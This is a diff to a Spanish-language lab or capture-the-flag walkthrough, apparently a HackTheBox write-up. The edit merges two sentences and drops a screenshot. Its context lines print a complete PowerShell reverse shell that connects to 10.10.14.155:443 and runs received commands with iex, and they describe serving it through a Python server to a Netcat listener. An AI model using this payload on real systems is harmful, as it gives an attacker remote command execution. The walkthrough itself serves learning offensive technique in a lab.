@@ -232,11 +232,7 @@ Busque en [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThi
 $client = New-Object System.Net.Sockets.TCPClient("10.10.14.155",443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' 
 ```
 
-Abrí un servidor por **Python** para descargar la reverse shell desde "mssqlclient" y una sesión de Netcat por el puerto 443.
-
-![Captura de pantalla (594)](https://user-images.githubusercontent.com/69093629/123466160-4bc47b80-d5ef-11eb-9c7f-3bf41e88e033.png)
-
-Ejecute el siguiente comando para descargar la reverse shell.
+Abrí un servidor por **Python** para descargar la reverse shell desde "mssqlclient" y una sesión de Netcat por el puerto 443, ejecute el siguiente comando para descargar la reverse *Shell*.
 
 ```powershell
 ┌─[root@parrot]─[/home/wackyhacker/Desktop]
